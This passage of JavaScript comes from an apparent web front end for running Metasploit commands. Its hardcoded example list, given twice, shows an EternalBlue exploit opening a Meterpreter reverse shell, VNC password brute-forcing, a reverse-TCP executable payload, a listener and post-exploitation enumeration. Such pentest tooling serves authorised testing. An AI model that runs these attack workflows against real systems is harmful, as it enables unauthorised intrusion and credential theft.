                showMessageModal('Metasploit Running', 'Metasploit is already running. Please wait for it to finish or clear output to stop.');
                return;
            }

            const command = document.getElementById('command_text').value;
            if (!command) {
                showMessageModal('Error', 'No command to run.');
                return;
            }

            // Disable run button and clear output
            document.getElementById('run_msfconsole_button').disabled = true;
            document.getElementById('output_text').innerHTML = '';
            currentOutputBuffer = "";
            clearSearchHighlight();
            showStatus('Starting Metasploit...', 'blue');

            try {
                const response = await fetch('/run_msfconsole', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ command: command }),
                });
                const data = await response.json();
                if (data.status === 'error') {
                    showMessageModal('Error', data.message);
                    showStatus(`Error: ${data.message}`, 'red');
                    document.getElementById('run_msfconsole_button').disabled = false;
                } else {
                    currentProcessId = data.scan_id; // Use the scan_id returned by the backend
                    showStatus(`Metasploit command started (ID: ${currentProcessId}). Fetching output...`, 'blue');
                    // Start polling for output
                    pollInterval = setInterval(pollOutput, 500); // Poll every 500ms
                }
            } catch (error) {
                console.error('Error starting Metasploit:', error);
                showMessageModal('Error', 'An error occurred while starting Metasploit.');
                showStatus('An error occurred while starting Metasploit.', 'red');
                document.getElementById('run_msfconsole_button').disabled = false;
            }
        }

        // Function to search for a module
        async function searchModule() {
            const moduleName = document.getElementById('module_name_entry').value.trim();
            if (!moduleName) {
                showMessageModal('Search Error', 'Please enter a module name to search.');
                return;
            }
            // Temporarily set a dummy module type to generate the search command
            document.getElementById('module_type_select').value = '';
            document.getElementById('module_name_entry').value = moduleName; // Ensure it's set for generation
            await generateCommand();
            runMsfconsole(); // Run the generated search command
        }

        // Polling for msfconsole output
        async function pollOutput() {
            if (!currentProcessId) {
                clearInterval(pollInterval);
                pollInterval = null;
                return;
            }

            try {
                const response = await fetch(`/get_msf_output/${currentProcessId}`);
                const data = await response.json();
                const outputTextElement = document.getElementById('output_text');
                
                if (data.output) {
                    // Only append new output to the buffer
                    const newOutputSegment = data.output.substring(currentOutputBuffer.length);
                    currentOutputBuffer += newOutputSegment;
                    insertColoredText(outputTextElement, currentOutputBuffer);
                }

                if (data.status === 'running') {
                    showStatus('Metasploit is running...', 'blue');
                } else if (data.status === 'completed' || data.status === 'success' || data.status === 'error') {
                    clearInterval(pollInterval);
                    pollInterval = null;
                    currentProcessId = null;
                    currentOutputBuffer = data.output; // Get final complete output
                    insertColoredText(outputTextElement, currentOutputBuffer);
                    if (data.status === 'completed' || data.status === 'success') {
                        showStatus('Metasploit command completed successfully.', 'green');
                    } else {
                        showStatus(`Command failed: ${data.message || 'Unknown error'}`, 'red');
                        showMessageModal('Command Error', data.message || 'An unknown error occurred during the command execution.');
                    }
                    document.getElementById('run_msfconsole_button').disabled = false;
                    // Re-enable install buttons if they were disabled for installation
                    document.getElementById('install_msf_linux_button').disabled = false;
                    document.getElementById('install_msf_termux_button').disabled = false;
                    document.getElementById('download_msf_windows_button').disabled = false;
                } else if (data.status === 'not_found') {
                    clearInterval(pollInterval);
                    pollInterval = null;
                    currentProcessId = null;
                    showStatus(`Command failed: ${data.message || 'Process ID not found or expired.'}`, 'red');
                    showMessageModal('Command Error', data.message || 'Process ID not found or expired.');
                    document.getElementById('run_msfconsole_button').disabled = false;
                    // Re-enable install buttons if they were disabled for installation
                    document.getElementById('install_msf_linux_button').disabled = false;
                    document.getElementById('install_msf_termux_button').disabled = false;
                    document.getElementById('download_msf_windows_button').disabled = false;
                }
            } catch (error) {
                console.error('Error polling output:', error);
                showMessageModal('Polling Error', 'An error occurred while fetching output.');
                showStatus('An error occurred while fetching output.', 'red');
                clearInterval(pollInterval);
                pollInterval = null;
                currentProcessId = null;
                document.getElementById('run_msfconsole_button').disabled = false;
                // Re-enable install buttons if they were disabled for installation
                document.getElementById('install_msf_linux_button').disabled = false;
                document.getElementById('install_msf_termux_button').disabled = false;
                document.getElementById('download_msf_windows_button').disabled = false;
            }
        }

        // Helper to insert colored text based on Metasploit output patterns
        function insertColoredText(element, text) {
            element.innerHTML = ''; // Clear current content to re-insert with spans
            const lines = text.split('\n');
            const fragment = document.createDocumentFragment();

            lines.forEach(line => {
                const span = document.createElement('span');
                let className = 'output-default';

                if (line.toLowerCase().includes('successfully') || line.toLowerCase().includes('started reverse tcp handler') || line.toLowerCase().includes('session opened')) {
                    className = 'output-green';
                } else if (line.toLowerCase().includes('error') || line.toLowerCase().includes('failed') || line.toLowerCase().includes('exploit aborted')) {
                    className = 'output-red';
                } else if (line.toLowerCase().includes('msf') || line.toLowerCase().includes('module') || line.toLowerCase().includes('options') || line.toLowerCase().includes('payload') || line.toLowerCase().includes('target') || line.toLowerCase().includes('executing command') || line.toLowerCase().includes('detected')) {
                    className = 'output-blue';
                } else if (line.toLowerCase().includes('warning')) {
                    className = 'output-orange';
                }
                
                span.className = className;
                span.textContent = line + '\n'; // Add newline back for pre tag
                fragment.appendChild(span);
            });
            element.appendChild(fragment);
            element.scrollTop = element.scrollHeight; // Scroll to bottom
        }

        // Function to clear output
        function clearOutput() {
            document.getElementById('output_text').innerHTML = '';
            currentOutputBuffer = "";
            showStatus('Ready');
            clearSearchHighlight();
            if (currentProcessId) {
                clearInterval(pollInterval);
                pollInterval = null;
                currentProcessId = null;
            }
        }

        // Function to save output
        async function saveOutput() {
            const outputContent = document.getElementById('output_text').innerText;
            if (!outputContent.trim()) {
                showMessageModal('Save Output', 'No output to save.');
                return;
            }

            // Prompt for filename (simple browser prompt)
            const defaultFilename = `msfconsole_output_${new Date().toISOString().slice(0,10)}.txt`;
            const filename = prompt("Enter filename to save:", defaultFilename);

            if (filename) {
                try {
                    const response = await fetch('/save_output', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ content: outputContent, filename: filename })
                    });
                    const data = await response.json();

                    if (data.status === 'success') {
                        showMessageModal('Save Output', `Output saved on the server. You can download it now.`);
                        // Offer download link
                        if (data.download_url) {
                            const downloadLink = document.createElement('a');
                            downloadLink.href = data.download_url;
                            downloadLink.download = filename; // Suggest filename for download
                            downloadLink.style.display = 'none';
                            document.body.appendChild(downloadLink);
                            downloadLink.click();
                            document.body.removeChild(downloadLink);
                        }
                    } else {
                        showMessageModal('Save Error', `Failed to save file: ${data.message}`);
                    }
                } catch (error) {
                    console.error('Error saving output:', error);
                    showMessageModal('Save Error', `Failed to save file: ${error.message}`);
                }
            }
        }

        // Function to update status bar
        function showStatus(message, color = 'white') {
            const statusBar = document.getElementById('status_bar');
            statusBar.textContent = message;
            statusBar.style.color = color;
        }

        // Function to search output
        function searchOutput() {
            const searchTerm = document.getElementById('search_entry').value.trim().toLowerCase();
            const outputTextElement = document.getElementById('output_text');
            const fullText = outputTextElement.textContent; // Use textContent to get plain text

            clearSearchHighlight(); // Clear existing highlights first

            if (!searchTerm) {
                searchStartIndex = 0;
                return;
            }

            let found = false;
            let newContent = '';
            let lastIndex = 0;

            const regex = new RegExp(searchTerm, 'gi'); // 'gi' for global and case-insensitive

            let match;
            while ((match = regex.exec(fullText)) !== null) {
                found = true;
                const index = match.index;
                const matchedText = match[0];

                // Append content before the match
                newContent += escapeHtml(fullText.substring(lastIndex, index));
                // Append the highlighted match
                newContent += `<mark class="highlight">${escapeHtml(matchedText)}</mark>`;
                lastIndex = index + matchedText.length;
            }
            newContent += escapeHtml(fullText.substring(lastIndex)); // Append remaining content

            outputTextElement.innerHTML = newContent;

            if (!found) {
                showMessageModal('Search', `No occurrences of '${searchTerm}' found.`);
            } else {
                // Scroll to the first highlighted element
                const firstHighlight = outputTextElement.querySelector('mark.highlight');
                if (firstHighlight) {
                    firstHighlight.scrollIntoView({ behavior: 'smooth', block: 'center' });
                }
            }
        }

        // Function to clear search highlight
        function clearSearchHighlight() {
            const outputTextElement = document.getElementById('output_text');
            const currentContent = outputTextElement.textContent; // Get plain text content
            outputTextElement.innerHTML = ''; // Clear existing content
            insertColoredText(outputTextElement, currentContent); // Re-insert without highlights
            searchStartIndex = 0;
        }

        // Function to show help popup
        function showHelp(helpText) {
            const overlay = document.createElement('div');
            overlay.className = 'help-popup-overlay';
            overlay.onclick = () => {
                document.body.removeChild(overlay);
                document.body.removeChild(popup);
            };
            document.body.appendChild(overlay);

            const popup = document.createElement('div');
            popup.className = 'help-popup';
            popup.innerHTML = `
                <h3 class="text-xl font-bold text-purple-300 mb-4">Help</h3>
                <div class="flex-grow overflow-y-auto custom-scrollbar p-2 bg-gray-600 rounded text-gray-200 text-sm mb-4">
                    ${helpText.replace(/\n/g, '<br>')}
                </div>
                <button class="bg-purple-500 hover:bg-purple-600 text-white px-4 py-2 rounded-md self-center" onclick="this.parentNode.parentNode.removeChild(this.parentNode); document.body.removeChild(document.querySelector('.help-popup-overlay'));">Close</button>
            `;
            document.body.appendChild(popup);
        }

        // --- Examples Tab Functions ---
        async function loadExamples() {
            try {
                // Fetch examples from the backend (assuming /get_examples endpoint)
                const response = await fetch('/get_examples');
                if (response.ok) {
                    allExamples = await response.json();
                } else {
                    // Fallback to hardcoded examples if backend fails
                    console.warn("Could not fetch examples from backend, using hardcoded examples.");
                    allExamples = [
                        {
                            "name": "EternalBlue Exploit (MS17-010)",
                            "description": "Exploits the EternalBlue vulnerability (SMBv1) to gain remote code execution.",
                            "options": {
                                "module_type_select": "exploit",
                                "module_name_entry": "windows/smb/ms17_010_eternalblue",
                                "rhost_entry": "192.168.1.100",
                                "rport_entry": 445,
                                "payload_entry": "windows/x64/meterpreter/reverse_tcp",
                                "lhost_entry": "192.168.1.10",
                                "lport_entry": 4444,
                                "run_exploit_var": true
                            },
                            "example_output": `msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100
RHOSTS => 192.168.1.100
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RPORT 445
RPORT => 445
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.10
LHOST => 192.168.1.10
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 4444
LPORT => 4444
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit -j -z
[*] Exploit running as background job 0.
[*] Started reverse TCP handler on 192.168.1.10:4444 
[*] 192.168.1.100:445 - The target is vulnerable.
[*] 192.168.1.100:445 - Attempting to trigger the vulnerability...
[*] Sending stage (175686 bytes) to 192.168.1.100
[*] Meterpreter session 1 opened (192.168.1.10:4444 -> 192.168.1.100:49178) at 2025-07-29 21:00:00 +0200
`
                        },
                        {
                            "name": "VNC Login Auxiliary Module",
                            "description": "Scans for VNC services and attempts to log in with common credentials.",
                            "options": {
                                "module_type_select": "auxiliary",
                                "module_name_entry": "scanner/vnc/vnc_login",
                                "rhost_entry": "192.168.1.0/24",
                                "rport_entry": 5900,
                                "custom_options_entry": "PASS_FILE /usr/share/wordlists/rockyou.txt\nSTOP_ON_SUCCESS true",
                                "run_exploit_var": true
                            },
                            "example_output": `msf6 > use auxiliary/scanner/vnc/vnc_login
msf6 auxiliary(scanner/vnc/vnc_login) > set RHOSTS 192.168.1.0/24
RHOSTS => 192.168.1.0/24
msf6 auxiliary(scanner/vnc/vnc_login) > set RPORT 5900
RPORT => 5900
msf6 auxiliary(scanner/vnc/vnc_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
PASS_FILE => /usr/share/wordlists/rockyou.txt
msf6 auxiliary(scanner/vnc/vnc_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true
msf6 auxiliary(scanner/vnc/vnc_login) > run
[*] Scanned 254 of 254 hosts (100% complete)
[+] 192.168.1.105:5900 - Login Successful: 'password'
[*] Auxiliary module execution completed
`
                        },
                        {
                            "name": "Windows Gather Post Module",
                            "description": "Collects information from a compromised Windows host.",
                            "options": {
                                "module_type_select": "post",
                                "module_name_entry": "windows/gather/enum_logged_on_users",
                                "custom_options_entry": "SESSION 1",
                                "run_exploit_var": true
                            },
                            "example_output": `msf6 > use post/windows/gather/enum_logged_on_users
msf6 post(windows/gather/enum_logged_on_users) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/enum_logged_on_users) > run
[*] Running module against WIN-SERVER
[*] Enumerating currently logged on users...
[*]   User: Administrator (Active)
[*]   User: Guest (Disconnected)
[*] Post module execution completed
`
                        },
                        {
                            "name": "Generate Windows Executable Payload",
                            "description": "Generates a standalone Windows executable (Meterpreter reverse TCP).",
                            "options": {
                                "module_type_select": "payload",
                                "module_name_entry": "windows/meterpreter/reverse_tcp",
                                "lhost_entry": "192.168.1.10",
                                "lport_entry": 4444,
                                "custom_options_entry": "SET EXITFUNC process",
                                "additional_args_entry": "generate -f exe -o /tmp/shell.exe"
                            },
                            "example_output": `msf6 > use windows/meterpreter/reverse_tcp
msf6 payload(windows/meterpreter/reverse_tcp) > set LHOST 192.168.1.10
LHOST => 192.168.1.10
msf6 payload(windows/meterpreter/reverse_tcp) > set LPORT 4444
LPORT => 4444
msf6 payload(windows/meterpreter/reverse_tcp) > set EXITFUNC process
EXITFUNC => process
msf6 payload(windows/meterpreter/reverse_tcp) > generate -f exe -o /tmp/shell.exe
[+] Writing 73802 bytes to /tmp/shell.exe...
`
                        },
                        {
                            "name": "Search for Modules",
                            "description": "Searches for Metasploit modules containing a specific keyword.",
                            "options": {
                                "module_name_entry": "eternalblue"
                            },
                            "example_output": `msf6 > search eternalblue

Matching Modules
================

   #  Name                                     Disclosure Date  Rank       Check  Description
   -  ----                                     ---------------  ----       -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-04-14       excellent  Yes    Microsoft Windows SMBv1 Remote Code Execution Vulnerability
   1  auxiliary/scanner/smb/smb_ms17_010         2017-04-14       normal     No     SMBv1 MS17-010 Detection

`
                        },
                        {
                            "name": "List Active Sessions",
                            "description": "Displays all currently active Metasploit sessions.",
                            "options": {
                                "sessions_list_var": true
                            },
                            "example_output": `msf6 > sessions -l

Active sessions
===============

  Id  Name  Type        Information                     Connection
  --  ----  ----        -----------                     ----------
  1         meterpreter x64/windows WIN-SERVER          192.168.1.10:4444 -> 192.168.1.100:49178 (192.168.1.100)
  2         shell       x86/linux   kali@kali-vm        192.168.1.10:4445 -> 192.168.1.101:43210 (192.168.1.101)
`
                        },
                        {
                            "name": "Use Multi/Handler",
                            "description": "Sets up a generic handler to catch incoming connections from payloads.",
                            "options": {
                                "module_type_select": "exploit",
                                "module_name_entry": "multi/handler",
                                "payload_entry": "windows/meterpreter/reverse_tcp",
                                "lhost_entry": "0.0.0.0",
                                "lport_entry": 4444,
                                "run_exploit_var": true
                            },
                            "example_output": `msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 1.
[*] Started reverse TCP handler on 0.0.0.0:4444 
`
                        },
                        {
                            "name": "Show Exploit Options",
                            "description": "Displays the configurable options for a specific exploit module.",
                            "options": {
                                "module_type_select": "exploit",
                                "module_name_entry": "windows/smb/ms17_010_eternalblue",
                                "show_options_var": true
                            },
                            "example_output": `msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file
   RPORT    445              yes       The target port (TCP)
   SMBPASS                   no        The password for the specified username
   SMBUSER                   no        The username to authenticate as
   ...
`
                        },
                        {
                            "name": "Check Vulnerability",
                            "description": "Checks if a target is vulnerable to a specific exploit without actually exploiting it.",
                            "options": {
                                "module_type_select": "exploit",
                                "module_name_entry": "windows/smb/ms17_010_eternalblue",
                                "rhost_entry": "192.168.1.100",
                                "check_exploit_var": true
                            },
                            "example_output": `msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100
RHOSTS => 192.168.1.100
msf6 exploit(windows/smb/ms17_010_eternalblue) > check
[*] 192.168.1.100:445 - The target is vulnerable.
`
                        },
                        {
                            "name": "Kill a Session",
                            "description": "Terminates an active Metasploit session by its ID.",
                            "options": {
                                "kill_session_entry": 1
                            },
                            "example_output": `msf6 > sessions -k 1
[*] Killing session 1...
`
                        }
                    ];
                }
                filterExamples(); // Display all examples initially
            } catch (error) {
                console.error('Error loading examples:', error);
                showStatus('Error loading examples. Using hardcoded examples.', 'red');
                // Ensure allExamples is populated even if fetch fails
                allExamples = [
                    {
                        "name": "EternalBlue Exploit (MS17-010)",
                        "description": "Exploits the EternalBlue vulnerability (SMBv1) to gain remote code execution.",
                        "options": {
                            "module_type_select": "exploit",
                            "module_name_entry": "windows/smb/ms17_010_eternalblue",
                            "rhost_entry": "192.168.1.100",
                            "rport_entry": 445,
                            "payload_entry": "windows/x64/meterpreter/reverse_tcp",
                            "lhost_entry": "192.168.1.10",
                            "lport_entry": 4444,
                            "run_exploit_var": true
                        },
                        "example_output": `msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100
RHOSTS => 192.168.1.100
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RPORT 445
RPORT => 445
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.10
LHOST => 192.168.1.10
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 4444
LPORT => 4444
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit -j -z
[*] Exploit running as background job 0.
[*] Started reverse TCP handler on 192.168.1.10:4444 
[*] 192.168.1.100:445 - The target is vulnerable.
[*] 192.168.1.100:445 - Attempting to trigger the vulnerability...
[*] Sending stage (175686 bytes) to 192.168.1.100
[*] Meterpreter session 1 opened (192.68.1.10:4444 -> 192.168.1.100:49178) at 2025-07-29 21:00:00 +0200
`
                    },
                    {
                        "name": "VNC Login Auxiliary Module",
                        "description": "Scans for VNC services and attempts to log in with common credentials.",
                        "options": {
                            "module_type_select": "auxiliary",
                            "module_name_entry": "scanner/vnc/vnc_login",
                            "rhost_entry": "192.168.1.0/24",
                            "rport_entry": 5900,
                            "custom_options_entry": "PASS_FILE /usr/share/wordlists/rockyou.txt\nSTOP_ON_SUCCESS true",
                            "run_exploit_var": true
                        },
                        "example_output": `msf6 > use auxiliary/scanner/vnc/vnc_login
msf6 auxiliary(scanner/vnc/vnc_login) > set RHOSTS 192.168.1.0/24
RHOSTS => 192.168.1.0/24
msf6 auxiliary(scanner/vnc/vnc_login) > set RPORT 5900
RPORT => 5900
msf6 auxiliary(scanner/vnc/vnc_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
PASS_FILE => /usr/share/wordlists/rockyou.txt
msf6 auxiliary(scanner/vnc/vnc_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true
msf6 auxiliary(scanner/vnc/vnc_login) > run
[*] Scanned 254 of 254 hosts (100% complete)
[+] 192.168.1.105:5900 - Login Successful: 'password'
[*] Auxiliary module execution completed
`
                    },
                    {
                        "name": "Windows Gather Post Module",
                        "description": "Collects information from a compromised Windows host.",
                        "options": {
                            "module_type_select": "post",
                            "module_name_entry": "windows/gather/enum_logged_on_users",
                            "custom_options_entry": "SESSION 1",
                            "run_exploit_var": true
                        },
                        "example_output": `msf6 > use post/windows/gather/enum_logged_on_users
msf6 post(windows/gather/enum_logged_on_users) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/enum_logged_on_users) > run
[*] Running module against WIN-SERVER
[*] Enumerating currently logged on users...
[*]   User: Administrator (Active)
[*]   User: Guest (Disconnected)
[*] Post module execution completed
`
                    },
                    {
                        "name": "Generate Windows Executable Payload",
                        "description": "Generates a standalone Windows executable (Meterpreter reverse TCP).",
                        "options": {
                            "module_type_select": "payload",
                            "module_name_entry": "windows/meterpreter/reverse_tcp",
                            "lhost_entry": "192.168.1.10",
                            "lport_entry": 4444,
                            "custom_options_entry": "SET EXITFUNC process",
                            "additional_args_entry": "generate -f exe -o /tmp/shell.exe"
                        },
                        "example_output": `msf6 > use windows/meterpreter/reverse_tcp
msf6 payload(windows/meterpreter/reverse_tcp) > set LHOST 192.168.1.10
LHOST => 192.168.1.10
msf6 payload(windows/meterpreter/reverse_tcp) > set LPORT 4444
LPORT => 4444
msf6 payload(windows/meterpreter/reverse_tcp) > set EXITFUNC process
EXITFUNC => process
msf6 payload(windows/meterpreter/reverse_tcp) > generate -f exe -o /tmp/shell.exe
[+] Writing 73802 bytes to /tmp/shell.exe...
`
                    },
                    {
                        "name": "Search for Modules",
                        "description": "Searches for Metasploit modules containing a specific keyword.",
                        "options": {
                            "module_name_entry": "eternalblue"
                        },
                        "example_output": `msf6 > search eternalblue

Matching Modules
================

   #  Name                                     Disclosure Date  Rank       Check  Description
   -  ----                                     ---------------  ----       -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-04-14       excellent  Yes    Microsoft Windows SMBv1 Remote Code Execution Vulnerability
   1  auxiliary/scanner/smb/smb_ms17_010         2017-04-14       normal     No     SMBv1 MS17-010 Detection

`
                    },
                    {
                        "name": "List Active Sessions",
                        "description": "Displays all currently active Metasploit sessions.",
                        "options": {
                            "sessions_list_var": true
                        },
                        "example_output": `msf6 > sessions -l

Active sessions
===============

  Id  Name  Type        Information                     Connection
  --  ----  ----        -----------                     ----------
  1         meterpreter x64/windows WIN-SERVER          192.168.1.10:4444 -> 192.168.1.100:49178 (192.168.1.100)
  2         shell       x86/linux   kali@kali-vm        192.168.1.10:4445 -> 192.168.1.101:43210 (192.168.1.101)
`
                    },
                    {
                        "name": "Use Multi/Handler",
                        "description": "Sets up a generic handler to catch incoming connections from payloads.",
                        "options": {
                            "module_type_select": "exploit",
                            "module_name_entry": "multi/handler",
                            "payload_entry": "windows/meterpreter/reverse_tcp",
                            "lhost_entry": "0.0.0.0",
                            "lport_entry": 4444,
                            "run_exploit_var": true
                        },
                        "example_output": `msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 1.
[*] Started reverse TCP handler on 0.0.0.0:4444 
`
                    },
                    {
                        "name": "Show Exploit Options",
                        "description": "Displays the configurable options for a specific exploit module.",
                        "options": {
                            "module_type_select": "exploit",
                            "module_name_entry": "windows/smb/ms17_010_eternalblue",
                            "show_options_var": true
                        },
                        "example_output": `msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file
   RPORT    445              yes       The target port (TCP)
   SMBPASS                   no        The password for the specified username
   SMBUSER                   no        The username to authenticate as
   ...
`
                    },
                    {
                        "name": "Check Vulnerability",
                        "description": "Checks if a target is vulnerable to a specific exploit without actually exploiting it.",
                        "options": {
                            "module_type_select": "exploit",
                            "module_name_entry": "windows/smb/ms17_010_eternalblue",
                            "rhost_entry": "192.168.1.100",
                            "check_exploit_var": true
                        },
                        "example_output": `msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100
RHOSTS => 192.168.1.100
msf6 exploit(windows/smb/ms17_010_eternalblue) > check
[*] 192.168.1.100:445 - The target is vulnerable.
`
                    },
                    {
                        "name": "Kill a Session",
                        "description": "Terminates an active Metasploit session by its ID.",
                        "options": {
                            "kill_session_entry": 1
                        },
                        "example_output": `msf6 > sessions -k 1
[*] Killing session 1...
`
                    }
                ];
                filterExamples();
            }
        }


        function filterExamples() {
            const searchQuery = document.getElementById('example_search_entry').value.toLowerCase();
            const examplesList = document.getElementById('examples_list');
            examplesList.innerHTML = ''; // Clear current list

            allExamples.forEach(example => {
                if (example.name.toLowerCase().includes(searchQuery) || example.description.toLowerCase().includes(searchQuery)) {
                    const exampleDiv = document.createElement('div');
                    exampleDiv.className = 'bg-gray-800 p-4 rounded-lg shadow-md flex flex-col md:flex-row justify-between items-start md:items-center';
                    exampleDiv.innerHTML = `
                        <div>
                            <h3 class="text-lg font-semibold text-purple-300">${escapeHtml(example.name)}</h3>
                            <p class="text-sm text-gray-400 mb-2 md:mb-0">${escapeHtml(example.description)}</p>
                        </div>
                        <div class="flex mt-2 md:mt-0 space-x-2">
                            <button class="bg-green-600 hover:bg-green-700 text-white px-3 py-1 rounded-md text-sm" onclick="loadExampleOptions(${escapeHtml(JSON.stringify(example.options))})">Select</button>
                            <button class="bg-indigo-600 hover:bg-indigo-700 text-white px-3 py-1 rounded-md text-sm" onclick="showExampleOutputModal('${escapeHtml(example.name)} Output', ${escapeHtml(JSON.stringify(example.example_output))})">Output</button>
                        </div>
                    `;
                    examplesList.appendChild(exampleDiv);
                }
            });
            lucide.createIcons(); // Re-render Lucide icons for new elements
        }

        function clearExampleSearch() {
            document.getElementById('example_search_entry').value = '';
            filterExamples();
        }

        function loadExampleOptions(options) {
            clearAllInputs(); // Clear all inputs first

            // Populate form fields with example options
            for (const key in options) {
                const element = document.getElementById(key);
                if (element) {
                    if (element.type === 'checkbox' || element.type === 'radio') {
                        element.checked = options[key];
                    } else if (element.tagName === 'TEXTAREA') {
                        element.value = options[key];
                    } else {
                        element.value = options[key];
                    }
                }
            }
            generateCommand(); // Re-generate command after loading
            showMessageModal('Example Loaded', 'Example options have been loaded. Check other tabs and the generated command.');
            showTab('module-selection'); // Switch to module selection tab
        }

        // Helper to escape HTML for safe display
        function escapeHtml(text) {
            if (typeof text !== 'string') {
                text = String(text);
            }
            const map = {
                '&': '&amp;',
                '<': '&lt;',
                '>': '&gt;',
                '"': '&quot;',
                "'": '&#039;'
            };
            return text.replace(/[&<>"']/g, function(m) { return map[m]; });
        }

        // Helper to unescape HTML entities (not strictly needed for this usage but good practice)
        function unescapeHtml(html) {
            const doc = new DOMParser().parseFromString(html, 'text/html');
            return doc.documentElement.textContent;
        }

        function clearAllInputs() {
            document.querySelectorAll('#tab-content-container input[type="text"], #tab-content-container input[type="number"], #tab-content-container textarea').forEach(element => {
                element.value = '';
            });
            document.querySelectorAll('#tab-content-container input[type="checkbox"], #tab-content-container input[type="radio"]').forEach(element => {
                element.checked = false;
            });
            document.querySelectorAll('#tab-content-container select').forEach(element => {
                element.value = ''; // Clear dropdown selection
            });
            // Ensure the hidden radio button is checked to clear other radio selections
            document.getElementById('action_radio_none').checked = true;
            generateCommand();
        }

        // Function to handle Metasploit installation
        async function handleMsfInstallation(platformType) {
            const linuxButton = document.getElementById('install_msf_linux_button');
            const termuxButton = document.getElementById('install_msf_termux_button');
            const windowsButton = document.getElementById('download_msf_windows_button');

            // Disable all install buttons during an installation attempt
            linuxButton.disabled = true;
            termuxButton.disabled = true;
            windowsButton.disabled = true;

            showStatus('Checking system and preparing for installation...', 'blue');
            document.getElementById('output_text').innerHTML = ''; // Clear output area
            currentOutputBuffer = ""; // Clear output buffer for installation logs

            if (platformType === 'linux' || platformType === 'termux') {
                const osName = platformType === 'termux' ? "Termux" : "Linux";
                showInstallConfirmModal(
                    'Install Metasploit',
                    `Your operating system is <strong>${osName}</strong>. Do you want to install Metasploit now? This will require superuser privileges and might ask for your password in the server console. This process can take a long time.`,
                    async () => {
                        // This function will be called if the user confirms
                        showStatus(`Installing Metasploit on ${osName}...`, 'blue');
                        try {
                            const response = await fetch('/install_metasploit', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ platform: platformType }) // Pass platform type to backend
                            });
                            const data = await response.json();

                            if (data.status === 'error') {
                                showStatus(`Metasploit installation failed: ${data.message}`, 'red');
                                showMessageModal('Metasploit Installation Failed', `Failed to install/update Metasploit: ${data.message}<br><br>Output:<pre>${escapeHtml(data.output)}</pre>`, true);
                                insertColoredText(document.getElementById('output_text'), data.output);
                                // Re-enable buttons on error
                                linuxButton.disabled = false;
                                termuxButton.disabled = false;
                                windowsButton.disabled = false;
                            } else { // status is 'running' for real-time output
                                currentProcessId = data.scan_id; // Use the scan_id returned by the backend
                                showStatus(`Metasploit installation started (ID: ${currentProcessId}). Fetching output...`, 'blue');
                                pollInterval = setInterval(pollOutput, 500); // Start polling for output
                            }
                        } catch (error) {
                            console.error('Error during Metasploit installation fetch:', error);
                            showStatus('An error occurred during installation.', 'red');
                            showMessageModal('Metasploit Installation Error', `An error occurred while trying to install Metasploit: ${error.message}. Check server logs for more details.`);
                            // Re-enable buttons on error
                            linuxButton.disabled = false;
                            termuxButton.disabled = false;
                            windowsButton.disabled = false;
                        }
                    }
                );
            } else if (platformType === 'windows') {
                const downloadMessage = `Metasploit cannot be installed directly via this web interface on Windows.
                <br><br>
                Please download the installer from the official Rapid7 website:
                <br><br>
                <a href="https://www.rapid7.com/products/metasploit/download/" target="_blank" class="text-purple-400 hover:underline">Download Metasploit for Windows</a>`;
                showMessageModal('Install Metasploit', downloadMessage, true); // Use isHtml = true
